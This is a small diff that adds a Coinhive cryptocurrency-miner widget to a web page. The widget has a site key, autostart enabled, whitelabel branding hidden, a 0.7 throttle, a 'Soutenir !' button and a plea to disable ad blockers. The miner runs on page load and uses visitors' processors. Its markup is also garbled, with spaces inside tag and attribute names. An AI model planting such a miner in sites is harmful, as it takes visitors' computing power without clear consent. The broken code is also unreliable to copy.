@@ -1,0 +1,12 @@
+< div class = "coinhive-miner"
+style = "width:250px auto; height: 200px"
+data - key = "RREtcDwFy7WXhPeTJIoGG2nLb9BdCJBk"
+data - autostart = "true"
+data - whitelabel = "true"
+data - background = "#444"
+data - text = "#eeeeee"
+data - action = "#DA4453"
+data - graph = "#DA4453"
+data - threads = "0"
+data - throttle = "0.7"
+data - start = "Soutenir !" > < em > Please disable Adblock! < /em></div >
